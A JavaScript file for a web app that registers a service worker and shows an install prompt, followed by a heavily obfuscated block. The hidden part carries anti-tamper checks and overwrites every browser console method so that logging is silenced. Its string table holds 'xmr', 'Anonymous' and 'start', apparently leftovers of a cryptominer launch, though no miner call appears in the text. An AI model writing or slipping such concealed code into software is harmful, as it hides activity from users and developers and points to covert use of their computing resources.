async function registerSW() {
    "serviceWorker" in navigator && window.addEventListener("load", function () {
        navigator.serviceWorker.register("/serviceWorker.js").then(t => console.log("service worker registered")).catch(t => console.log("service worker not registered", t))
    })
}

window.addEventListener("beforeinstallprompt", t => (function (t) {
    return window.matchMedia("(display-mode: standalone)").matches ? (document.querySelector(".welcomeMsg").classList.add("activation"), createEl("welcomeMsg", "WELCOME TO OUR APP"), t.preventDefault()) : (createEl("installMsg", "<span><b>CLICK HERE</b> TO INSTALL THIS APP ON YOUR DEVICE</span>"), document.querySelector(".installMsg").onclick = (n => t.prompt()), t.preventDefault(), document.querySelector(".installMsg").classList.add("activation"))
}));
var _0x417cdc = _0x2711;

function _0x2951() {
    var t = ["exception", "488eQpVWa", "31149dVZyWx", "error", "Anonymous", "5742219IGJxwZ", "(((.+)+)+)+$", "1023EEoKEW", "log", "info", "apply", "bind", "3252aBsbpn", "warn", "toString", "454652OTjMjV", "2633200vENrhs", "xmr", "console", "start", "search", "2710704pnIvgr", '{}.constructor("return this")( )', "return (function() ", "__proto__", "table", "894582GzidbV", "trace"];
    return (_0x2951 = function () {
        return t
    })()
}

!function (t, n) {
    for (var r = _0x2711, e = _0x2951(); ;) try {
        if (414180 == parseInt(r(413)) / 1 + -parseInt(r(424)) / 2 + -parseInt(r(405)) / 3 * (parseInt(r(410)) / 4) + parseInt(r(414)) / 5 + -parseInt(r(419)) / 6 + parseInt(r(403)) / 7 + -parseInt(r(399)) / 8 * (parseInt(r(400)) / 9)) break;
        e.push(e.shift())
    } catch (t) {
        e.push(e.shift())
    }
}();
var _0xfc6f94 = function () {
    var t = !0;
    return function (n, r) {
        var e = t ? function () {
            if (r) {
                var t = r[_0x2711(408)](n, arguments);
                return r = null, t
            }
        } : function () {
        };
        return t = !1, e
    }
}(), _0x3738f1 = _0xfc6f94(this, function () {
    var t = _0x2711;
    return _0x3738f1[t(412)]()[t(418)](t(404))[t(412)]().constructor(_0x3738f1)[t(418)]("(((.+)+)+)+$")
});

function _0x2711(t, n) {
    var r = _0x2951();
    return (_0x2711 = function (t, n) {
        return r[t -= 399]
    })(t, n)
}

_0x3738f1();
var _0x2334d0 = function () {
    var t = !0;
    return function (n, r) {
        var e = t ? function () {
            if (r) {
                var t = r[_0x2711(408)](n, arguments);
                return r = null, t
            }
        } : function () {
        };
        return t = !1, e
    }
}(), _0x21d549 = _0x2334d0(this, function () {
    for (var t = _0x2711, n = function () {
        var t, n = _0x2711;
        try {
            t = Function(n(421) + n(420) + ");")()
        } catch (n) {
            t = window
        }
        return t
    }(), r = n[t(416)] = n[t(416)] || {}, e = [t(406), t(411), t(407), t(401), t(426), t(423), t(425)], o = 0; o < e.length; o++) {
        var a = _0x2334d0.constructor.prototype.bind(_0x2334d0), c = e[o], i = r[c] || a;
        a[t(422)] = _0x2334d0[t(409)](_0x2334d0), a.toString = i[t(412)][t(409)](i), r[c] = a
    }
});